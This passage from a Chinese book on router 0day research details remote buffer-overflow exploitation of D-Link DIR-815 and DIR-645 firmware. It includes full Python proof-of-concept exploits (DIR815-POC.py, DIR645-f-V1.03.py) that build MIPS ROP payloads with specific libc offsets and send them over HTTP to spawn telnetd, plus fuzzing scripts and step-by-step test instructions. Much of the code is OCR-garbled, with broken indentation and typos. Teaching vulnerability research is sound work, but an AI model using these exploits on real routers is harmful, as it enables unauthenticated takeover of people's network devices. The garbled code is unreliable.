搜索 libc.so.0 动态库中 system 函数的地址。在 IDA 中打开 /lib/libc.so.0，在 “Functions window” 窗口中输入 “system”，搜索 system 函数，然后双击找到的函数，在 “IDA View-A” 窗口就可以看到 system 函数了，如图 10-21 所示，其偏移为 0x53200。

 </div>

找到 system 函数地址以后，搜索可以调用 system 的指令。使用 IDA 插件 “MIPS ROP Finder” 在 libc.so.0 中搜索调用 system 函数的指令。在菜单栏中依次单击 “Search” → “mips rop gadgets” 选项，使插件初始化，插件的安装步骤参见第 2 章。按钮如图 10-22 所示。

初始化完成后， IDA 的 “Output Window” 中的初始化结果如图 10-23 所示。在 “Output window” 窗口下方的文本框中输入命令 “mipsrop.stackfinders()”，搜索所有把堆栈数据放入寄存器中的指令。这里选择 0x159CC 处的指令，该指令序列如图 10-24 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>File</td><td style='text-align: center; word-wrap: break-word;'>Edit</td><td style='text-align: center; word-wrap: break-word;'>Jump</td><td style='text-align: center; word-wrap: break-word;'>Search</td><td style='text-align: center; word-wrap: break-word;'>View</td><td style='text-align: center; word-wrap: break-word;'>Debugger</td><td style='text-align: center; word-wrap: break-word;'>Options</td><td style='text-align: center; word-wrap: break-word;'>Windows</td><td style='text-align: center; word-wrap: break-word;'>Help</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="4">Output window</td></tr><tr><td colspan="4">Loading type libraries...</td></tr><tr><td colspan="4">Auto analysis subsystem has been initialized.</td></tr><tr><td colspan="4">Database for file &#x27;libc.so.0&#x27; has been loaded.</td></tr><tr><td colspan="4">Compiling file &#x27;Z:\opt\ida61\ida61\idc\ida.idc&#x27;...</td></tr><tr><td colspan="4">Executing function &#x27;main&#x27;...</td></tr><tr><td colspan="4">Z:\opt\ida61\ida61\plugins\dbfix.plw; incompatible plugin version, skipped</td></tr><tr><td colspan="4">Python 2.6.5 (r265:79096, Mar 19 2010, 21:48:26) [MSC v.1500 32 bit (Intel)]</td></tr><tr><td colspan="4">IDAPython v1.5.0 final (serial 0)(c) The IDAPython Team &lt;idapython@googlegroups.com&gt;</td></tr><tr><td colspan="4">MIPS ROP Finder activated, found 1553 controllable jumps between 0x00009CE0 and 0x00053F80</td></tr><tr><td colspan="4">Python</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>AU: idle</td><td style='text-align: center; word-wrap: break-word;'>Down</td><td style='text-align: center; word-wrap: break-word;'>Disk: 24GB</td><td style='text-align: center; word-wrap: break-word;'>Various hints</td></tr></table>

 </div>

 </div>

0x159CC 处的指令序列如图 10-25 所示。该指令序列首先将 $SP+0x10 地址存入寄存器 $S5 中，而在偏移 0x159E0 处将 $S5 作为参数存入 $a0，也就是说，这里需要将第一步得到的 system 地址填充到 $S0 中，然后在 $SP+0x10 处填充需要执行的命令，即可实现对 system("command") 函数的调用。

 </div>

原本到这里 ROP 的构造就应该结束了，但事实上远没有如此简单。因为 libc.so.0 是动态加载的，系统加载 libc.so.0 动态库时基地址为 0x2aaf8000，所以开始获取的 system 地址 0x53200 实际上只是一个相对基址的偏移地址，需要把 ROP 链的偏移地址（如 0x53200）与基地址 0x2aaf8000 相加，才是 system 函数的真实地址 0x2AB4B200。但这里 system 函数的真实地址对数据构造极为不利，因为 system 地址的最低位为 0x00，而在 hedwig_main 获取 Cookie 的过程中，也没有对这部分数据进行解码，所以，试图通过访问 hedwig.cgi 时对 Cookie 进行编码来避开 0x00 是不可能的，这就使 sprintf 函数可能被截断，造成缓冲区溢出失败。

这里有一个“曲线救国”的方法：对 $SO$ 中的 system 使用计算的方法，先将 $SO$ 覆盖真实地址附近的一个不包含 0x00 的地址值，然后在 libc.so.0 中搜索指令，通过对 $SO$ 进行加减操作，在调用 system 函数前将其修改为 0x2AB4B200。

下面的方法是将 $SO 覆盖为 0x2B029FF（0x2aaf8000+0x531ff），然后在 libc.so.0 中搜索一条指令对 $SO 进行操作，再跳转到 “call system” 指令。搜索 system 地址计算指令时使用 MIPS ROP Finder 插件，命令为 “mipsrop.find(“addiu $s0,1");”，如图 10-26 所示。

 </div>

完整的 ROP 构造和调用过程如图 10-27 所示。

 </div>

#### 10.3.3 生成POC

在构造 ROP 以后，根据 ROP 的构造编写如下代码与路由器进行交互，以实现漏洞利用。

源码 DIR815-POC.py

1 import sys
2 import time
3 import string
4 import socket
5 from random import Random
6 import urlib, urlib2, httplib
7 class MIPSPayload:
8     BADBYTES = [0x00]
9     LITTLE = "little"
10     BIG = "big"
11     FILLER = "A"
12     BYTES = 4
13     def __init__(self, libase=0, endianess=LITTLE, badbytes=BADBYTES):
14         self.libase = libase
15         self.shellcode = ""
16         self.endianess = endianess
17         self.badbytes = badbytes
18         def rand_text(self, size):

揭秘家用路由器 Oday 漏洞挖掘技术

19 str = ''
20 chars
'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
21 length = len(chars) - 1
22 random = Random()
23 for i in range(size):
24 str += chars[random.randint(0,length)]
25 return str
26 def Add(self, data):
27     self.shellcode += data
28     def Address(self, offset, base=None):
29         if base is None:
30             base = self.libase
31             return self.ToString(base + offset)
32     def AddAddress(self, offset, base=None):
33             self.Add(self.Address(offset, base))
34     def AddBuffer(self, size, byte=FILLER):
35             self.Add(byte * size)
36     def AddNops(self, size):
37             if self.endianess == self.LITTLE:
38                    self.Add(self.rand_text(size))
39                    else:
40                    self.Add(self.rand_text(size))
41     def ToString(self, value, size=BYTES):
42                    data = ""
43                    for i in range(0, size):
44                    data += chr((value >> (8*i)) & 0xFF)
45                    if self.endianess != self.LITTLE:
46                    data = data[::-1]
47                    return data
48     def Build(self):
49                    count = 0
50                    for c in self.shellcode:
51                    for byte in self.badbytes:
52                    if c == chr(byte):
53                    raise Exception("Bad byte found in shellcode at offset %d: 0x%.2X" % (count, byte))
54                    count += 1
55                    return self.shellcode
56                  def Print(self, bpl=BYTES):
57                  i = 0
58                  for c in self.shellcode:
59                    if i == 4:

print ""

i = 0

sys.stdout.write("\x%.2X" % ord(c))

sys.stdout.flush()

if bpl > 0:

    i += 1

##### print "\n"

##### class HTTP:

HTTP = 'http'

def __init__(self, host, proto=HTTP, verbose=False):

    self.host = host

    self.proto = proto

    self.verbose = verbose

    self.encode_params = True

def Encode(self, data):

    # just for DIR645

    if type(data) == dict:

        pdata = []

        for k in data.keys():

            pdata.append(k + '=' + data[k])

            data = pdata[1] + '&' + pdata[0]

if data is not None:

    data = self.Encode(data)

if self.verbose:

    print url

httpcli = httplib.HTTPConnection(self.host, 80, timeout=30)

httpcli.request('POST', uri, data, headers=headers)

102 if __name__ == 'main_':
103  libc = 0x2aaf8000#0x40854000#
104  target = {
105    "645-1.03" : [
106    0x531ff,
107    0x158c8,
108    0x159cc,
109    ],
110    "815-1.01" : [
111    0x531ff,
112    0x158c8,
113    0x159cc,
114    ],
115    }
116  v = '815-1.01'
117  cmd = 'telnetd'
118  ip = '192.168.0.1'
119  payload = MIPSPayload(endianess="little", badbytes=[0x0d, 0x0a])
120  payload.AddNops(973)  # filler
121  payload.AddAddress(target[v][0], base=libc)  # $s0
122  payload.AddNops(4)  # $s1
123  payload.AddNops(4)  # $s2
124  payload.AddNops(4)  # $s3
125  payload.AddNops(4)  # $s4
126  payload.AddAddress(target[v][2], base=libc)  # $s5
127  payload.AddNops(4)  # unused($s6)
128  payload.AddNops(4)  # unused($s7)
129  payload.AddNops(4)  # unused($gp)
130  payload.AddAddress(target[v][1], base=libc)  # $ra
131  payload.AddNops(4)  # fill
132  payload.AddNops(4)  # fill
133  payload.AddNops(4)  # fill
134  payload.AddNops(4)  # fill
135  payload.Add(cmd)  # shellcode
136  pdata = {
137    'uid' : 'test',
138    'password' : 'AbC',
139    }
140    #open('t', 'w').write(payload.Build())
141    #sys.exit()
142    #print len(payload.Build())
143  header = {
144    'Cookie' : 'uid='+payload.Build(),

'Accept-Encoding': 'gzip, deflate',
'Content-Type': 'application/x-www-form-urlencoded',
'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
}

'HTTP(ip).Send('hedwig.cgi',
data=data, headers=header, encode_params=False, response=True)
except httplib.BadStatusLine:
print "Payload delivered."
except Exception, e:
print "2Payload delivery failed: %s" % str(e)

下面对 DIR-815 路由器 POC 中攻击数据的构造进行简要分析。

第 103 行：“ $  \text{libc} = 0x2aaf8000  $”是  $  \text{libc.so.0}  $ 这个动态库的加载基址。

第 104 行～第 115 行：已经测试了的两个可以利用的目标的 ROP Chian，指令偏移来自 libc.so.0。

第 116 行：选择该脚本测试的路由器型号，并加载相应的 ROP 链。

第 117 行：触发漏洞以后执行的命令字符串。

第 118 行：被测试路由器的 IP 地址。

第 119 行：创建一个 MIPSPayload 类的对象 payload，初始化编码格式为小端机，在 Shellcode 中排除坏字符 “\x0d\x0a”。

第 120 行：用 973 字节的内容随机字符填充。

第 121 行～第 130 行：按照漏洞利用中构造的 ROP Chain，接下来的堆栈，而这些堆栈在 hedwig_main 返回前会覆盖那些关键的寄存器。

第 131 行～第 134 行：填充 0x10 字节的数据，在第 135 行填充需要执行的命令。

## 10.4 漏洞测试

##### 测试环境

将 D-Link DIR-815 路由器与攻击机连接（有线或无线连接都可以）。

##### 测试流程

01 打开网页，访问网关。默认网关是 192.168.0.1。浏览器访问 192.168.0.1，在首页上可以看到当前路由器的型号和固件版本。

02 攻击前，尝试通过 Telnet 登录 192.168.0.1，命令为 “telnet 192.168.0.1”，登录失败。

03 执行测试脚本 DIR815-POC.py，进行攻击。

04 使用 Telnet 登录 192.168.0.1，命令为 “telnet 192.168.0.1”，攻击成功，路由器的 Telnet 服务被打开。

整个过程如图 10-28 所示。登录路由器以后，就可以使用命令对路由器进行控制了。在路由器中执行 ifconfig 命令，查看路由器各网卡的配置信息。

 </div>

# 第 11 章 D-Link DIR-645 路由器 溢出漏洞分析

本章实验测试环境说明如表 11-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>测试环境</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>操作系统</td><td style='text-align: center; word-wrap: break-word;'>Ubuntu 12.04</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>文件系统提取工具</td><td style='text-align: center; word-wrap: break-word;'>Binwalk 2.0</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>调试器</td><td style='text-align: center; word-wrap: break-word;'>IDA 6.1</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>利用代码解释器</td><td style='text-align: center; word-wrap: break-word;'>Python 2.7</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

## 11.1 漏洞介绍

D-Link DIR-645 路由器造型独特，完全颠覆了传统路由器方正、呆板的造型，如图 11-1 所示。

 </div>

D-Link DIR-645 路由器内置了 6 个 “智能天线”，可根据接入设备和应用环境的不同，自行搭配最适合的天线工作组合，以达到最好的无线连接效果。其自带的 USB 端口可结合该无线路由的 SharePort 技术，将连接路由器的如打印机等 USB 外接设备通过 Wi-Fi 网络与无线网内的所有用户共享。而 4 个千兆 LAN 口不仅可为用户带来 10/100/1000Mb/s 的高速局域网应

用，更能预先划分优先级，用户只要按需接入相关设备，即可实现端口流量控制，轻松分配带宽，进一步提升网络分享体验。但就是这款在外表和功能上都表现卓越的智能路由器，却被发现存在一些致命的漏洞，exploit-db 上 POC 的描述如图 11-2 所示。可以看出，该漏洞影响 DIR-645、DIR-865 及 DIR-845 路由器。

www.exploit-db.com/exploits/33862/
super(update_info(info,
'Name' => 'D-Link authentication.cgi Buffer Overflow',
'Description' => %q{
    This module exploits an remote buffer overflow vulnerability on several D-Link routers.
    The vulnerability exists in the handling of HTTP queries to the authentication.cgi with
    long password values. The vulnerability can be exploitable without authentication. This
    module has been tested successfully on D-Link firmware DIR645A1_FW103B11. Other firmware
    such as the DIR865LA1_FW101b06 and DIR845LA1_FW100b20 are also vulnerable.
},

 </div>

而从 D-Link 官方发布的安全公告 http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10008 来看，仅提及这个漏洞会影响 D-Link DIR-645 路由器，如图 11-3 所示。

Buffer overflow on authentication.cgi
The third buffers overflow vulnerability affects the "authentication.cgi" CGI script. This time the issue affects the HTTP POST parameter name "password". Again, this vulnerability can be abused to achieve remote code execution. As for all the previous issues, no authentication is required.

 </div>

该漏洞是 CGI 脚本 authentication.cgi 在读取 POST 参数中名为 “password” 参数的值时可造成缓冲区溢出，并获得远程命令执行，硬件环境说明如表 11-2 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>描述</td><td style='text-align: center; word-wrap: break-word;'>备注</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>型号</td><td style='text-align: center; word-wrap: break-word;'>DIR645</td><td style='text-align: center; word-wrap: break-word;'>D-Link</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>硬件版本</td><td style='text-align: center; word-wrap: break-word;'>A1</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>固件版本</td><td style='text-align: center; word-wrap: break-word;'>V1.03</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>指令系统</td><td style='text-align: center; word-wrap: break-word;'>MIPSEL</td><td style='text-align: center; word-wrap: break-word;'>小端机格式</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>QEMU</td><td style='text-align: center; word-wrap: break-word;'>1.7.90</td><td style='text-align: center; word-wrap: break-word;'>处理器模拟软件</td></tr></table>

该漏洞的分析和测试环境与 D-Link DIR-645 路由器相同，漏洞影响的固件版本如下。

> DIR645A1_FW103B11

> DIR865LA1_FW101b06

> DIR845LA1_FW100b20

## 11.2 漏洞分析

下面我们对该漏洞进行详细分析。

#### 11.2.1 固件分析

从 D-Link 官方技术支持网站下载固件，下载链接为 ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP，解压缩后得到固件 dir645_FW_103.bin。

使用 Binwalk 将固件中的文件系统提取出来，如图 11-4 所示。

 </div>

该漏洞的核心组件为 /htdocs/web/authentication.cgi，如图 11-5 所示。可以看到，漏洞组件 authentication.cgi 是一个指向 ./htdocs/cgibin 的符号链接，即真正的漏洞代码在 cgibin 中。

#### 11.2.2 漏洞成因分析

从漏洞公告中我们已经知道，漏洞产生的原因是 HTTP 的 POST 参数中名为 “password” 参数的值超长时，可造成缓冲区溢出，并获得远程命令执行。接下来就具体定位和分析一下漏洞产生的原因。

在 D-Link DIR-645 路由器的文件系统中，authentication.cgi 与 hedwig.cgi 一样，也指向 cgibin，因此，这里 IDA 加载程序时仍然加载 /htdocs/cgibin。

/https://www.example.com/

 </div>

对该漏洞的分析将从另外一个角度去解析。利用已有的 POC 定位漏洞，使用的 bash 脚本如下。根据漏洞公告中提供的信息，我们可以建立如下测试脚本。

#!/bin/bash
# run_cgi.sh
#sudo ./run_cgi.sh `python -c "print 'uid=1234&password='+'A'*0x600"'
"uid=1234"
INPUT=$1"
TEST=$2"
LEN=$(echo -n "$INPUT" | wc -c)
PORT="1234"
if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
    echo -e "\nUsage: sudo $0 \n"
    exit 1
fi
cp $(which qemu-mipsel) ./qemu
echo $TEST
echo "$INPUT" | chroot . ./qemu -E CONTENT LENGTH=$LEN -E
CONTENT TYPE="application/x-www-form-urlencoded"
REQUEST METHOD="POST" -E REQUEST URI="/authentication.cgi" -E
REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/authentication.cgi
2>/dev/null
echo 'run ok'
rm -f ./qemu

第 3 行：指向该脚本进行测试的命令，从命令行中可以看到，构造的第 1 个参数就是构造 HTTP 的 POST 数据。

第 15 行：利用 QEMU 模拟执行 authentication.cgi 并传递通过变量 $INPUT 伪造的 POST 参数。

在本次分析中，我们不再从静态的反汇编开始分析定位漏洞，而是直接使用 run_cgi.sh 入手分析，步骤如下。

01 运行 run_cgi.sh，将 IDA 加载 authentication.cgi 附加调试，在 authentication_main 函数堆栈空间分配完毕后的地址 0x0040B024 处下断点。

02 在 “Hex-View-1” 标签页中定位到 saved_ra，以便观察在调试中 saved_ra 地址何时被覆盖，从而定位漏洞函数。

下面就根据上面的步骤具体分析一下。

使用如下命令运行 authentication.cgi。

~/book-source/645/_dir645_FW_103.bin.extracted/squashfs-root$ sudo ./run_cgi.sh `python -c "print 'uid=1234&password='+'A*0x600" "uid=1234"

然后，使用 IDA 附加调试器，在如图 11-6 所示的 authentication_main 函数的 0x0040B024 处下断点，就可以使用快捷键 “F9” 让程序运行至断点。

 </div>

此时，authentication_main 堆栈空间已经分配完毕。接下来，进行至关重要的第二步，即在 0x0040B028 处的 saved_ra 上单击右键，在弹出的快捷菜单中选择 “Jump in a new hex window” 选项，此时在 “IDA View-PC” 标签页旁边会新建 “Hex View-3” 标签页，如图 11-7 所示。在该标签页中，0x408000CC 处高亮显示的 “0x00” 即为 saved_ra 的最低位，这样就得到了 saved_ra 在栈中的地址。

 </div>

为了避免在调试过程中不断切换“IDA View-PC”标签页和“Hex View-3”标签页，复制saved_ra地址后，在“IDAView-PC”标签页下方的“Hex-View-1”标签页（窗口可能被最小化了，可以通过拖动缩小Output Window，放大“Hex-View-1”标签页）上使用快捷键“G”跳转到0x408000CC处，如图11-8所示。这样做是因为在溢出发生时会覆盖saved_ra，所以可以通过观察saved_ra何时被覆盖来缩小分析范围，甚至可能定位存在漏洞的函数。

 </div>

准备就绪，单步运行程序（按 “F8” 键），当程序运行到 0x0040B500 处时，“Hex View-1” 标签页中 0x408000CC 处的 saved_ra 值还没有被覆盖为 0x41414141，如图 11-9 所示。

但是，当 read 函数执行完后，0x408000CC 处就被覆盖了，因此，可以确定该 read 函数会引发一个缓冲区溢出漏洞，如图 11-10 所示。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>x</td><td style='text-align: center; word-wrap: break-word;'>Debugger</td><td style='text-align: center; word-wrap: break-word;'>x</td><td style='text-align: center; word-wrap: break-word;'>Structures</td><td style='text-align: center; word-wrap: break-word;'>x</td><td style='text-align: center; word-wrap: break-word;'>En</td><td style='text-align: center; word-wrap: break-word;'>Emums</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>IDAView-PC</td><td style='text-align: center; word-wrap: break-word;'>X</td><td style='text-align: center; word-wrap: break-word;'>Hex View-3</td><td colspan="4">General registers</td></tr></table>

 </div>

为了避免遇到与 DIR-815 路由器 hedwig.cgi 漏洞类似的二次溢出，这里继续运行。果然，运行过程中在使用 “F8” 键单步经过 0x0040B514 处的函数 sub_40A424 时，程序崩溃了，看来这里确实存在一些问题。重新运行程序，在 0x0040B514 处下断点，使用快捷键 “F7” 进入函数 sub_40A424，然后以单步（按 “F8” 键）方式执行，在执行 getenv(" HTTP_COOKIE") 函数时，程序就崩溃了，如图 11-11 所示。

 </div>

单击警告窗口中的“OK”按钮，让程序停在异常地址。查看异常位置反汇编，发现0x408888A0 处的“lbu $v0,0($a1)”指令，该指令的功能是在读取寄存器 $a1 指向的地址内存数据时发生异常。查看寄存器 $a1，已经取得被覆盖的值 0x41414141，内存中并不存在 0x41414141 地址，导致了异常的发生，如图 11-12 所示。

这里发生了异常崩溃，但是并没有达到我们希望的能够控制程序执行流程的效果。通过对该异常进行跟踪分析发现，寄存器 $a1 中的 0x41414141 是溢出数据覆盖了堆栈上的一些重要的数据结构，这些数据结构在 0x0040A494 处执行 getenv 函数的过程中会被使用，正常数据被覆盖而导致 $a1 取到了 0x41414141，最终导致异常，如图 11-13 所示。

因此，我们尝试缩小负载中 password 值的长度，命令如下。

~/boqk-source/645/_dir645_FW_103.bin.extracted/squashfs-root$ sudo ./run_cgi.sh `python -c "print 'uid=1234&password='+'A*1160" ` "uid=1234"

 </div>

 </div>

这里依然使用 IDA 附加程序，运行到 authentication_main 函数返回，劫持程序执行流程，缓冲区溢出利用成功，如图 1.1-14 所示。因此，导致漏洞的函数确定为 read() 函数。

现在确定漏洞的原因是 read() 函数读取数据存入内存造成了缓冲区的溢出，接下来我们阅读代码，具体分析其中的原因。

先来看溢出点附近的几个函数。示例如下。

ssize_t read(int fd, void *buf, size_t count);

从打开的设备或文件中读取数据，示例如下。

int _fileno( FILE *stream *);

取得参数 stream 指定的文件流所使用的文件描述符，如图 11-15 所示。从反汇编 read() 函数附近的代码中可以看到，read() 函数的用法如下。

read(fileno(stdin), var_430, atoi(getenv("CONTENT_LENGTH")));

##### 揭秘家用路由器 0day 漏洞挖掘技术

 </div>

 </div>

read() 函数从 stdin（标准输入设备）读入长度为 HTTP 协议中由客户端传入的大小为“Content-length”定义字节长度的数据，写入堆栈中的局部变量 var_430。而 var_430 这个临时变量大小仅为 0x400，在 getenv() 函数获取 HTTP 协议中 Content-length 字段的长度值以后，就将数据读入 var_430 中。这里没有判断“Content-length”的长度，该长度可被定义为任意大小，因此造成缓冲区溢出。

在构造该漏洞的 POST 数据时，也不是任意格式的数据都可以造成缓冲区溢出的，它需要“id=XX&password=XX”形式的数据。

Read() 函数执行完毕，在 0x0040B55C 处，strstr 函数定位了 2 次，分别是对 “id=” 和 “password=” 定位，从而获取名字参数的值。如图 11-16 所示，对 “password=” 进行定位，获取其后面的数据，然后正常进入返回流程。

 </div>

如果无法获取这两个标签，那么程序会在运行 0x0040B588 处的指令时因为寻址错误导致程序提前崩溃，利用失败，如图 11-17 所示。

需要注意的是，前面已经分析了漏洞产生的真正原因，但是在对该漏洞分析的过程中发现，0x0040B5E4 处的 strncpy 在使用上存在 bug，在漏洞导致缓冲区溢出以后，会将 id 值和 password 值复制到堆栈的局部变量中，使用 strncpy 函数。strncpy 看似安全，但这里的使用是很危险的——本应该按照目的缓冲区大小进行复制，然而这里使用的却是源参数长度进行复制，所以同样可能造成缓冲区溢出。幸运的是，经过调试发现，在 strncpy 复制 password 参数后，是不能覆盖 saved_ra 的。我们对 strncpy 的现场进行分析，如图 11-18 所示。

但是，strnccpy 不能完成再次利用，要从 0x407FF928 覆盖到 0x408001CC，需要至少 0x8A4 字节的数据。而之前我们测试时，password 参数值长度为 0x600，这就导致程序提前崩溃。因此，在这里 strnccpy 不是造成本次缓冲区溢出的罪魁祸首，而是由于前面的 read() 函数读取了超长的 POST 数据而造成的溢出覆盖。

##### 揭秘家用路由器 0day 漏洞挖掘技术

 </div>

 </div>

到这里，漏洞的原因我们已经了然于心了。当访问路由器 Web 服务器 authentication.cgi 时，authentication_main 函数中的 read() 函数将整个 POST 参数读取到堆栈中，而 read() 函数没有验证 HTTP 协议中 Content-length 字段是否超过缓冲区大小，最终导致缓冲区溢出。为了使程序在溢出后能顺利劫持执行流程，程序中的 POST 数据应该被伪造成 “id=xx&password=xx” 的形式。

## 11.3 漏洞利用

下面介绍该漏洞的利用方式。

#### 11.3.1 漏洞利用方式：System/Exec

用 patternLocOffset.py 创建 1160 字节的定位字符串到 test_auth 文件，示例如下。

1 ~/book-source/645/_dir645_FW_103.bin.extracted/squashfs-root$ python patternLocOffset.py -c -l 1160 -f test_auth
2 [*] Create pattern string contains 1160 characters ok!
3 [+] output to test_auth ok!
4 [+] take time: 0.0019 s

在命令行中输入以下命令，运行 authentication.cgi。

1. ~/book-source/645/_dir645_FW_103.bin.extracted/squashfs-root$ sudo ./run_cgi.sh `python -c "print 'uid=1234&password=' +open('test_auth', 'r').read(1160)"` "uid=1234"

使用 IDA 加载 authentication.cgi 附加调试，并运行到 authentication_main 函数返回地址，查看寄存器 $SO 和 $RA，示例如下，如图 11-19 所示。

$S0 = 0x42386842
$RA = 0x42306a42

 </div>

在 authentication_main 函数返回后，可以使用与 DIR-815 路由器的 hedwig.cgi 相同的 ROP。因为 DIR-815 1.01 和 DIR-645 1.03 使用的 libc.so.0 动态库是一样的，所以关于 ROP 的选择，可以参考前面的内容。这里说一下覆盖 $SO 的偏移。使用 patternLocOffset.py 进行定位，得到在 password 参数中需要 1014 字节才能覆盖 $SO，示例如下。

1 ~/book-source/645/_dir645_FW_103.bin.extracted/squashfs-root$ python patternLocOffset.py -s 0x42386842 -l 1160
2 [*] Create pattern string contains 1160 characters ok!
3 [*] No exact matches, looking for likely candidates...
4 [+] Possible match at offset 1014 (adjusted another-endian)
5 [+] take time: 0.0023 s

#### 11.3.2 生成POC

最终的完整利用代码如下，执行成功后会在路由器的 2323 端口开放 Telnet 服务，命令为 “book-source/645/DIR645-f-V1.03.py”。

源码 DIR645-f - V1.03.py

1 import sys
2 import time
3 import string
4 import socket
5 from random import Random
6 import urlib, urlib2, httplib
7 class MIPSPayload:
8     BADBYTES = [0x00]
9     LITTLE = "little"
10     BIG = "big"
11     FILLER = "A"
12     BYTES = 4
13     def __init__(self, libase=0, endianess=LITTLE, badbytes=BADBYTES):
14         self.libase = libase
15         self.shellcode = ""
16         self.endianess = endianess
17         self.badbytes = badbytes
18         def rand_text(self, size):
19         str = ''
20         chars

'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPqRrSsTtUuVwWxYyZz0123456789'

length = len(chars) - 1
random = Random()
for i in range(size):
    str += chars[random.randint(0,length)]
    return str

def Add(self, data):
    self.shellcode += data
    ---snip---
    def AddNops(self, size):
        if self.endianess == self.LITTLE:
            self.Add(self.rand_text(size))
        else:
            self.Add(self.rand_text(size))
        ---snip...
        class HTTP:
            HTTP = 'http'
            def __init__(self, host, proto=HTTP, verbose=False):
            self.host = host
            self.proto = proto
            self.verbose = verbose
            self.encode_params = True

        ---snip---
        def __send__(self,uri,headers={}),data=None,response=False,encode_params=True):
            #发送构造的数据包

        ---snip---
        if __name__ == 'main':
            libc = 0x2aaf8000
        target = {
            "1.03": [
                0x531ff,
                0x158c8,
                0x159cc,
                ],
            ]
        }
    v = '1.03'
    cmd = 'telnetd-p 2323'
    ip = '192.168.0.1'
    payload = MIPSPayload(endianess="little", badbytes=[0x0d, 0x0a])
    payload.AddNops(1011)
    payload.AddAddress(target[v][0], base=libc)
    payload.AddNops(4)
    # $s1

揭秘家用路由器 0day 漏洞挖掘技术

63 payload.AddNops(4)  # $s2
64 payload.AddNops(4)  # $s3
65 payload.AddNops(4)  # $s4
66 payload.AddAddress(target[v][2], base=libc)  # $s5
67 payload.AddNops(4)  # unused($s6)
68 payload.AddNops(4)  # unused($s7)
69 payload.AddNops(4)  # unused($gp)
70 payload.AddAddress(target[v][1], base=libc)  # $ra
71 payload.AddNops(4)  # fill
72 payload.AddNops(4)  # fill
73 payload.AddNops(4)  # fill
74 payload.AddNops(4)  # fill
75 payload.Add(cmd)  # shellcode
76 pdata = {
    'uid' : '3Ad4',
    'password' : 'AbC' + payload.Build(),
}
80 header = {
    'Cookie' : 'uid='+'3Ad4',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
}
86 try:
87 HTTP(ip).Send('authentication.cgi',
data=pdata, headers=header, encode_params=False, response=True)
88 print '[+] execute ok'
89 except httplib.BadStatusLine:
90 print "Payload delivered."
91 except Exception, e:
92     print "2Payload delivery failed: %s" % str(e)

第 48 行～第 58 行：设置 libc.so.0 动态库基址（libc）、ROP 链（target）、需要执行的命令（cmd，在 2323 端口开放 Telent 服务）及路由器 IP 地址（ip）。

第 60 行：填充 1011 字节。

第 60 行～第 70 行：用构造的 ROP Chain 覆盖堆栈上的保留寄存器 $s0～$s7、$gp 和 $ra。

第 71 行～第 75 行：填充 0x10 字节以后，将要执行的命令覆盖到 0x10 字节之后。

第 76 行～第 79 行：将第 59 行～第 75 行伪造的数据填充到 POST 数据中。

第 87 行：使用 HTTP 协议发送伪造数据包。

## 11.4 漏洞测试

##### 测试环境

将 D-Link DIR-645 路由器与攻击机连接（有线或无线连接均可）。

##### 测试流程

01 打开网页，访问网关。这里网关是 192.168.0.1，浏览器访问 192.168.0.1，在首页上可以看到当前路由器的型号和固件版本。

02 执行测试脚本 DIR645-f-V1.03.py，会在路由器的 2323 端口开放 Telnet 服务。

03 使用 Telnet 登录 192.168.0.1，命令为 “telnet 192.168.0.1 2323”。

整个过程如图 11-20 所示。

 </div>

登录路由器以后，就可以使用命令对路由器进行控制了。在路由器中执行 ifconfig 命令，可以查看路由器各网卡的配置信息。

# 第 12 章 D-Link DIR-505 便携路由器 越界漏洞分析

本章实验测试环境说明如表 12-1 所示。

 </div>

